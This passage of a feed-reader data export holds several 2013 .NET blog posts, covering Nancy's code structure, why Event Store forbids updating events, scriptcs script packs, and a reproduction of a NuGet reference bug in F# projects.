id=\"file-gistfile1-txt-LC6\">    &lt;/assemblyBinding&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC7\">  &lt;/runtime&gt;</div><div class=\"line\" id=\"file-gistfile1-txt-LC8\">&lt;/configuration&gt;</div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/anonymous/5676329/raw/c91a0ddd751ce082686065a78563fe34050ef353/gistfile1.txt\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/anonymous/5676329#file-gistfile1-txt\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.txt</a><a href=\"https://gist.github.com/anonymous/5676329\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><h1><strong>On Nancy code structure</strong></h1><p>One very good point is that <em>Nancy.dll</em> is a single DLL that only depends on .NET Fx assemblies so it is optimally packaged.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyRefs.png\"><img class=\"alignnone size-full wp-image-834\" alt=\"NancyRefs\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyRefs.png\" width=\"573\" height=\"136\" /></a></p><p>On the other hand, this large DLL made of more than 7.000 lines of code and almost 300 classes, doesn’t abide by any kind of layered architecture. The consequence is that each namespace depends on all other namespaces.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyGraph.png\"><img class=\"alignnone size-full wp-image-831\" alt=\"NancyGraph\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyGraph.png\" width=\"571\" height=\"604\" /></a></p><p>As a consequences classes are not layered at all, there is no high level or low level classes.</p><p>Let’s have a look at the dependency matrix below. It is made of the 287 Nancy.dll classes, in mode indirect dependency. A blue cells means that the class in column depends (directly or indirectly) on the class in row, a green cell means the opposite, and a black cell means that the 2 classes are dependents on each others. A perfectly layered set of classes (which is not wished, but what should be approached) would be a lower triangular matrix blue, and a higher triangular matrix green. Here the matrix has blue and green cells mixed equally in both lower and higher triangulars, which is another way to figured out that classes are not layered.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyMatrix.jpg\"><img class=\"alignnone size-full wp-image-832\" alt=\"NancyMatrix\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/NancyMatrix.jpg\" width=\"600\" height=\"533\" /></a></p><p>It means that it must be difficult to unit-test a set of cohesive classes (i.e a component) in isolation from the others (even by using mocks that don’t help in case or re-entrant dependency). It also means that maintenance and evolution must be impaired by this absence of code structure, because touching a single class can virtually have an unexpected effect anywhere in the code base.</p><h2></h2><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/ssp1s-S4sD8\" height=\"1\" width=\"1\"/>","author":"Patrick Smacchia","_id":{"$wrap":"$oid","v":992}}
{"k":"0000000082","o":"0000006504","v":"001"}
{"_id":993,"_uid":993,"_dt":1373741607078,"_s":"2e97ba10f82cde2148d77952b02c95ab"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/NnDGk0Bxa9k/","title":"Why Can’t I Update an Event?","published":{"$wrap":"$date","v":1369722419000,"h":"2013-05-28T06:26:59.000Z"},"starred":false,"read":false,"content":"<p>Last week on a call with someone the question came up about the Event Store about why can they not update and event and how should they handle the case where they need to. The conversation that came out of this was very rich in architectural insight into how the event store works as well as overall event sourcing understanding so I thought that it would be worth spending a bit of time to write up where the constraint comes from.</p><h2>An Event Sourcing Perspective</h2><p>Let’s start with why you want to update an event? An event is a fact that happened at a point in time with the understanding of it from that point in time, a new understanding of the fact would be a new fact(naturally this does not apply to politicians). To update a previous event is generally a very bad idea. Many want to go back and update events to new versions, this is not the best way to handle versioning!</p><p>The prefered mechanism from an event sourcing perspective is to write a new face that supercedes the old fact. As an example I could write that event 7 is a mistake, this is a correction, I might as well put in a comment “this was due to bug #1342″ (similar to a journal entry in accounting). There are a few reasons this is a better way of handling things.</p><p>The first is my ability to look back at my history. If I were to change the fact and I look back at that point in time I have changed what it means. What about others who made decisions at that point in time? I can no longer see what it was they made decisions off of. Beyond this I might have a very valid query to ask your event streams of “how long on average does it take us to find bugs in previous events”.</p><p>The second model leads us to two types of queries supported on event streams (as-of vs as-at).</p><p>Beyond that with Event Sourcing the updating of an event can be inherently evil. How do you update any projections that the update occured? What about other subscribers who may be listening to the streams? Any easy answer might be to replay fully all involved with the stream but this quickly falls apart.</p><p>These are the primary reasons why the Event Store does not support an update operation on an event. There are however some wonderful architectural benefits that come from this particular constraint.</p><h2>Architectural Goodness</h2><p>If we prevent an event from ever being updated, what would the cachability of that event be? Yes it would be infinite. The Event Store supports a RESTful API (ATOM). All events served from the event store have infinite cachability, what does that mean?</p><p>Imagine you have a projection updating into a SQL table that has been running for the past eight weeks. You make a change and need to restart it (replaying from event 0). When the replay occurs and it requests events from the Event Store where do they likely come from? Your hard drive! You don’t make requests to the Event Store for them.</p><p>Beyond the events being infinitely cachable if you look through our atom implementation in fact every single request we serve with the exception of the head uri (http://somewhere.com/streams/{stream}) is also infinitely cachable. In other words when you want to reread $all (say for 5m events) you will hit exactly one non-cachable request!</p><p>This is very important when we start talking about scalability and performance. The Event Store can pretty easily serve 3-5k atom requests/second on a laptop (per node in clustered version) but how many will actually get to the Event Store? In order to scale you focus on commoditized reverse proxies in front of the Event Store not scaling the Event Store itself. nginx or varnish can easily saturate your network, just drop them in front only head calls make it through (and there is even a setting per stream to allow caching for x seconds of head links).</p><p>This is often a hard lesson to learn for developers. More often than not you should not try to scale your own software but instead prefer to scale commoditized things. Building performant and scalable things is hard, the smaller the surface area the better. Which is a more complex problem a basic reverse proxy or your business domain?</p><p>This also affects performance of replays for subscribers as you can place proxies near the subscribers (local http cache is a great start!). This is especially true for say an occasionally connected system. Gmail uses this trick to provide “offlining out of the box” for web apps. Since much of the data will already be in the http cache your hits will be hitting it, in many cases you can build say a mobile app with no further support.</p><p>Over Atom if we allowed updates, NO uris could be cachable!</p><h2>This is all cool but I actually need to update!</h2><p>Occasionally there might be a valid reason why an event actually needs to be updated, I am not sure what they are but I imagine there must be some that exist. There are a few ways this can actually be done.</p><p>The generally accepted way of handling the scenario while staying within the no-update constraintis to create an entire new stream, copy all the events from the old stream (manipulating as they are copied). Then delete the old stream. This may seem like a PITA but remember all of the discussion above (especially about updating subscribers!).</p><p>Some however may be using the TCP API and are willing to take the pains and complexity that come from subscribers (you can imagine they have none). In this one case, updates would be acceptable and simpler than adding new events. We have been going back and forth on whether or not to support this. It would not be much work at all for us but I imagine that it would be misused 1000 times for every 1 time it was used reasonably. I am reminded of the examples of being able to call .NET code from a biztalk orchestration or being able to execute .NET code inside my SQL database both have valid uses but should rarely be used. Perhaps we will make a command line parameter –run-with-scissors-updates or make people build from source to enable.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/NnDGk0Bxa9k\" height=\"1\" width=\"1\"/>","author":"gregyoung","_id":{"$wrap":"$oid","v":993}}
{"k":"0000000082","o":"0000008530","v":"001"}
{"_id":994,"_uid":994,"_dt":1373741607078,"_s":"6f54f49b6045179f0907e441c1653d5e"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/DPgX8Cv04nM/","title":"Scripting ease with Script Packs","published":{"$wrap":"$date","v":1368555028000,"h":"2013-05-14T18:10:28.000Z"},"starred":false,"read":false,"content":"<p>Script Packs are a really cool extensibility point we added into scriptcs. A pack delivers a bundle of functionality that makes frameworks more palatable to consume from script. They are available as nuget packages making them very easy to consume.</p><p>For example, if you look at our <a href=\"https://github.com/scriptcs/scriptcs-samples/tree/master/webapihost\">Web API sample</a>, you’ll see there’s a bunch of friction if you just try to get Web Api working from scratch.</p><ul><li>You need to add <a href=\"https://github.com/scriptcs/scriptcs-samples/blob/master/webapihost/start.csx#L4\">using</a> statements for each namespace you want to use. This is a lot more painful than one might think when you don’t have intellisense.</li><li>You need to <a href=\"https://github.com/scriptcs/scriptcs-samples/blob/master/webapihost/webapiconfig.csx#L11\">configure</a> web API, this involves creating a host, defining default routes etc. Adding lots of object creation and such starts to make the script pretty hairy. Not impossible, but painful when there’s no template.</li><li>You need to teach Web Api how to resolve controllers in script by implementing a custom <a href=\"https://github.com/scriptcs/scriptcs-samples/blob/master/webapihost/webapiconfig.csx#L1\">controller resolver</a>.</li></ul><p>Now pull in the <a href=\"https://github.com/scriptcs/scriptcs-webapi\">Web Api script pack</a> (scriptcs –install scriptcs.webapi) using the Require&lt;WebApi&gt;() function and your boiler plate code evaporates to this:</p><script src=\"http://gist.github.com/5578077.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5578077\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-cs-L1\" rel=\"file-gistfile1-cs-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-cs-L2\" rel=\"file-gistfile1-cs-L2\">2</span><span class=\"line-number\" id=\"file-gistfile1-cs-L3\" rel=\"file-gistfile1-cs-L3\">3</span><span class=\"line-number\" id=\"file-gistfile1-cs-L4\" rel=\"file-gistfile1-cs-L4\">4</span><span class=\"line-number\" id=\"file-gistfile1-cs-L5\" rel=\"file-gistfile1-cs-L5\">5</span><span class=\"line-number\" id=\"file-gistfile1-cs-L6\" rel=\"file-gistfile1-cs-L6\">6</span><span class=\"line-number\" id=\"file-gistfile1-cs-L7\" rel=\"file-gistfile1-cs-L7\">7</span><span class=\"line-number\" id=\"file-gistfile1-cs-L8\" rel=\"file-gistfile1-cs-L8\">8</span><span class=\"line-number\" id=\"file-gistfile1-cs-L9\" rel=\"file-gistfile1-cs-L9\">9</span><span class=\"line-number\" id=\"file-gistfile1-cs-L10\" rel=\"file-gistfile1-cs-L10\">10</span><span class=\"line-number\" id=\"file-gistfile1-cs-L11\" rel=\"file-gistfile1-cs-L11\">11</span><span class=\"line-number\" id=\"file-gistfile1-cs-L12\" rel=\"file-gistfile1-cs-L12\">12</span><span class=\"line-number\" id=\"file-gistfile1-cs-L13\" rel=\"file-gistfile1-cs-L13\">13</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-cs-LC1\"><span class=\"k\">public</span> <span class=\"k\">class</span> <span class=\"nc\">TestController</span> <span class=\"p\">:</span> <span class=\"n\">ApiController</span> <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC2\">  <span class=\"k\">public</span> <span class=\"kt\">string</span> <span class=\"nf\">Get</span><span class=\"p\">()</span> <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC3\">    <span class=\"k\">return</span> <span class=\"s\">\"Hello world!\"</span><span class=\"p\">;</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC4\">  <span class=\"p\">}</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC5\"><span class=\"p\">}</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC6\"> </div><div class=\"line\" id=\"file-gistfile1-cs-LC7\"><span class=\"kt\">var</span> <span class=\"n\">webApi</span> <span class=\"p\">=</span> <span class=\"n\">Require</span><span class=\"p\">&lt;</span><span class=\"n\">WebApi</span><span class=\"p\">&gt;();</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC8\"><span class=\"kt\">var</span> <span class=\"n\">server</span> <span class=\"p\">=</span> <span class=\"n\">webApi</span><span class=\"p\">.</span><span class=\"n\">CreateServer</span><span class=\"p\">(</span><span class=\"s\">\"http://localhost:8080\"</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC9\"><span class=\"n\">server</span><span class=\"p\">.</span><span class=\"n\">OpenAsync</span><span class=\"p\">().</span><span class=\"n\">Wait</span><span class=\"p\">();</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC10\"> </div><div class=\"line\" id=\"file-gistfile1-cs-LC11\"><span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"n\">WriteLine</span><span class=\"p\">(</span><span class=\"s\">\"Listening...\"</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC12\"><span class=\"n\">Console</span><span class=\"p\">.</span><span class=\"n\">ReadKey</span><span class=\"p\">();</span></div><div class=\"line\" id=\"file-gistfile1-cs-LC13\"><span class=\"n\">server</span><span class=\"p\">.</span><span class=\"n\">CloseAsync</span><span class=\"p\">().</span><span class=\"n\">Wait</span><span class=\"p\">();</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5578077/raw/5184de1b66121ec7838ca04d443069e8a4ab7cc7/gistfile1.cs\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5578077#file-gistfile1-cs\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.cs</a><a href=\"https://gist.github.com/glennblock/5578077\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>The script pack does all of the following to make the experience better:</p><ul><li>Removes the need for using statements for common namespaces. The script pack provides those which is why you don’t have to add the web api namespaces in your example above.</li><li>Adds dll and nuget package references that bring the dependencies the framework needs.</li><li>Removes general boilerplate code. In the previous sample you need to create a host, define routes etc as I mentioned. In this case the script pack creates the host for you and configure with the default routes. You can customize if you need to.</li><li>Provide APIs to fill gaps that prevent the framework from working well in script / supporting dynamically emitted assemblies. The Web Api script pack brings in and configures a custom controller resolver for you.</li></ul><p>We’re just getting started with the work we’ve done with script packs, but they are a really nice extensibility point and really take advantage of nuget as a delivery mechanism. The community has been rising to the occasion and building out quite the <a href=\"https://github.com/scriptcs/scriptcs/wiki/Script-Packs-master-list\">gallery</a> as well.</p><p>There’s some great posts about script packs covering topics like how to build them or even use them from the <a href=\"http://codebetter.com/glennblock/2013/05/07/scriptcs-gets-a-repl/\">REPL</a> that you should really check out.</p><ul><li><a title=\"http://blog.martindoms.com/2013/05/14/building-scriptcs-script-pack/\" href=\"http://blog.martindoms.com/2013/05/14/building-scriptcs-script-pack/\">http://blog.martindoms.com/2013/05/14/building-scriptcs-script-pack/</a></li><li><a title=\"http://scottksmith.com/blog/2013/05/14/deeper-dive-into-scriptcs/\" href=\"http://scottksmith.com/blog/2013/05/14/deeper-dive-into-scriptcs/\">http://scottksmith.com/blog/2013/05/14/deeper-dive-into-scriptcs/</a></li></ul><p>Have fun exploring the new world of scripting in C# with scriptcs!</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/DPgX8Cv04nM\" height=\"1\" width=\"1\"/>","author":"Glenn Block","_id":{"$wrap":"$oid","v":994}}
{"k":"0000000082","o":"0000038571","v":"001"}
{"_id":995,"_uid":995,"_dt":1373741607080,"_s":"2fdbc082bfb59b3778d3e35528b33403"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/9NF-NmFtzKg/nuget-install-is-broken-with-f.html","title":"NuGet Install Is Broken With F#","published":{"$wrap":"$date","v":1371132540000,"h":"2013-06-13T14:09:00.000Z"},"starred":false,"read":false,"content":"<p>There’s a very nasty bug when you try and use NuGet to add a package reference to an F# project. It manifests itself when either the assembly that is being installed also has a version in the GAC or a different version already exists in the output directory.</p><p><strong>First let’s reproduce the problem when a version of the assembly already exists in the GAC.</strong></p><p>Create a new solution with an F# project.</p><p>Choose an assembly that you want to install from NuGet that also exists in the GAC on your machine. For ironic purposes I’m going to choose NuGet.Core for this example.</p><p>It’s in my GAC:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">D:\\&gt;gacutil -l | find<span style=\"color: #006080\">\"NuGet.Core\"</span><br />NuGet.Core, Version=1.0.11220.104, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL<br />NuGet.Core, Version=1.6.30117.9648, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL</pre><br /></div><p></p><p>You can see that the highest version in the GAC is version 1.6.30117.9648</p><p>Now let’s install NuGet.Core version 2.5.0 from the official NuGet source:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">PM&gt; Install-Package NuGet.Core -Version 2.5.0<br />Installing<span style=\"color: #006080\">'Nuget.Core 2.5.0'</span>.<br />Successfully installed<span style=\"color: #006080\">'Nuget.Core 2.5.0'</span>.<br />Adding<span style=\"color: #006080\">'Nuget.Core 2.5.0'</span>to Mike.NuGetExperiments.FsProject.<br />Successfully added<span style=\"color: #006080\">'Nuget.Core 2.5.0'</span>to Mike.NuGetExperiments.FsProject.</pre><br /></div><p>It correctly creates a packages directory, downloads the NuGet.Core package and creates a packages.config file:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">D:\\Source\\Mike.NuGetExperiments\\src&gt;tree /F<br />D:.<br />│   Mike.NuGetExperiments.sln<br />│<br />├───Mike.NuGetExperiments.FsProject<br />│   │   Mike.NuGetExperiments.FsProject.fsproj<br />│   │   packages.config<br />│   │   Spike.fs<br />│   │<br />│   ├───bin<br />│   │   └───Debug<br />│   │<br />│   └───obj<br />│       └───Debug<br />│<br />└───packages<br />│   repositories.config<br />│<br />└───Nuget.Core.2.5.0<br />│   Nuget.Core.2.5.0.nupkg<br />│   Nuget.Core.2.5.0.nuspec<br />│<br />└───lib<br />└───net40-Client<br />NuGet.Core.dll</pre><br /></div><p></p><p>But when when I look at my fsproj file I see that it has incorrectly referenced the NuGet.Core version (1.6.30117.9648) from the GAC and there is no hint path pointing to the downloaded package.</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">&lt;Reference Include=<span style=\"color: #006080\">\"NuGet.Core, Version=1.6.30117.9648, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"</span>&gt;<br />&lt;Private&gt;True&lt;/Private&gt;<br />&lt;/Reference&gt;</pre><br /></div><p><strong>Next let’s reproduce the problem when a version of an assembly already exists in the output directory.</strong></p><p>This time I’m going to EasyNetQ as my example DLL. First I’m going to take a recent version of EasyNetQ.dll, 0.10.1.92 and drop it into to the projects output directory (bin\\Debug).</p><p>Next use NuGet to install an earlier version of the assembly:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">Install-Package EasyNetQ -Version 0.9.2.76<br />Attempting to resolve dependency<span style=\"color: #006080\">'RabbitMQ.Client (= 3.0.2.0)'</span>.<br />Attempting to resolve dependency<span style=\"color: #006080\">'Newtonsoft.Json (≥ 4.5)'</span>.<br />Installing<span style=\"color: #006080\">'RabbitMQ.Client 3.0.2'</span>.<br />Successfully installed<span style=\"color: #006080\">'RabbitMQ.Client 3.0.2'</span>.<br />Installing<span style=\"color: #006080\">'Newtonsoft.Json 4.5.11'</span>.<br />Successfully installed<span style=\"color: #006080\">'Newtonsoft.Json 4.5.11'</span>.<br />Installing<span style=\"color: #006080\">'EasyNetQ 0.9.2.76'</span>.<br />Successfully installed<span style=\"color: #006080\">'EasyNetQ 0.9.2.76'</span>.<br />Adding<span style=\"color: #006080\">'RabbitMQ.Client 3.0.2'</span>to Mike.NuGetExperiments.FsProject.<br />Successfully added<span style=\"color: #006080\">'RabbitMQ.Client 3.0.2'</span>to Mike.NuGetExperiments.FsProject.<br />Adding<span style=\"color: #006080\">'Newtonsoft.Json 4.5.11'</span>to Mike.NuGetExperiments.FsProject.<br />Successfully added<span style=\"color: #006080\">'Newtonsoft.Json 4.5.11'</span>to Mike.NuGetExperiments.FsProject.<br />Adding<span style=\"color: #006080\">'EasyNetQ 0.9.2.76'</span>to Mike.NuGetExperiments.FsProject.<br />Successfully added<span style=\"color: #006080\">'EasyNetQ 0.9.2.76'</span>to Mike.NuGetExperiments.FsProject.</pre><br /></div><p>NuGet reports that everything went according to plan and that EasyNetQ<em>0.9.2.76</em>has been successfully added to my project.</p><p>Once again the packages directory was successfully created and the correct version of EasyNetQ has been downloaded. The packages.config file also has the correct version of EasyNetQ. I won’t show you the output from ‘tree’ again, it’s much the same as before.</p><p>Again, when I look at my fsproj file the version of EasyNetQ is incorrect, it’s 0.10.1.92, and again there’s no hint path:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">&lt;Reference Include=<span style=\"color: #006080\">\"EasyNetQ, Version=0.10.1.92, Culture=neutral, PublicKeyToken=null\"</span>&gt;<br />&lt;Private&gt;True&lt;/Private&gt;<br />&lt;/Reference&gt;</pre><br /></div><p><strong>Yup, NuGet install is most definitely broken with F#.</strong></p><p>This bug makes using NuGet and F# together an exercise in frustration. Our team has wasted days attempting to get to the bottom of this.</p><p>It seems that it’s a well know problem. Just take a look at this workitem, reported over a year ago:</p><p><a href=\"http://nuget.codeplex.com/workitem/2149\">http://nuget.codeplex.com/workitem/2149</a></p><p>After much cursing of NuGet, the problem actually appears to be with the F# project system rather than with NuGet itself:</p><blockquote><p><em>“F# knows about this behavior and they will release the fix”</em></p></blockquote><p>Hmm, it hasn’t been fixed yet.</p><p>We had a dig around the NuGet code. The interesting piece is this file snippet (from NuGet.VisualStudio.VsProjectSystem):</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">virtual</span><span style=\"color: #0000ff\">void</span>AddReference(<span style=\"color: #0000ff\">string</span>referencePath, Stream stream)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span><span style=\"color: #0000ff\">string</span>name = Path.GetFileNameWithoutExtension(referencePath);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum4\" style=\"color: #606060\">4:</span><span style=\"color: #0000ff\">try</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum5\" style=\"color: #606060\">5:</span>{</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum6\" style=\"color: #606060\">6:</span><span style=\"color: #008000\">// Get the full path to the reference</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum7\" style=\"color: #606060\">7:</span><span style=\"color: #0000ff\">string</span>fullPath = PathUtility.GetAbsolutePath(Root, referencePath);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum8\" style=\"color: #606060\">8:</span><span style=\"color: #0000ff\">string</span>assemblyPath = fullPath;</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum9\" style=\"color: #606060\">9:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum10\" style=\"color: #606060\">10:</span>...</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum11\" style=\"color: #606060\">11:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum12\" style=\"color: #606060\">12:</span><span style=\"color: #008000\">// Add a reference to the project</span></pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum13\" style=\"color: #606060\">13:</span>dynamic reference = Project.Object.References.Add(assemblyPath);</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum14\" style=\"color: #606060\">14:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; 